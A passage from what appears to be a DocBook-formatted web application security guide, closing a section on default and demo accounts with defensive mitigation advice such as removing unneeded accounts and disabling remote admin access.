			If the account was a demo or test account the attacker will use this account as a means of accessing and abusing the application logic exposed to that user and using it as a mean of progressing with the attack.
			</para>
		</sect3>
		<sect3>
			<title>
			Mitigation Techniques
			</title>
			<para>
			Always change out of the box installation of the
			application. Remove all unnecessary accounts, following
			security checklist, vendor or public. Disable remote
			access to the admin accounts on the application. Use
			hardening scripts provided by the application vendors
			and vulnerability scanners to find the open accounts
			before someone else does.
			</para>
		</sect3>
	</sect2>
</sect1>
</chapter>
